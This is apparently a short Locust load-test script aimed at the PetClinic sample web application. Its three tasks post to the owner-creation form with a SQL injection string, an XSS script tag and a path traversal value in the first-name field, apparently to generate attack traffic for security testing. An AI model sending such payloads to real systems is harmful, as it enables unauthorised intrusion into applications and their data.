import time
from locust import HttpUser, task, between

class PetClinic(HttpUser):

    @task
    def exploitSqlInjection(self):
        payload = {'firstName': "smith' OR '1' = '1", 'lastName': 'blah', 'address': 'blah', 'city': 'blah', 'telephone': '1234567890'}
        self.client.post("/owners/new", data = payload, name = 'Exploit SQL Injection')

    @task
    def exploitXss(self):
        payload = {'firstName': '<script>alert(1)</script>', 'lastName': 'blah', 'address': 'blah', 'city': 'blah', 'telephone': '1234567890'}
        self.client.post('/owners/new', data = payload, name = 'Exploit XSS')

    @task
    def exploitPathTraversal(self):
        payload = {'firstName': '../main.jsp', 'lastName': 'blah', 'address': 'blah', 'city': 'blah', 'telephone': '1234567890'}
        self.client.post("/owners/new", data = payload, name = 'Exploit Path Traversal')


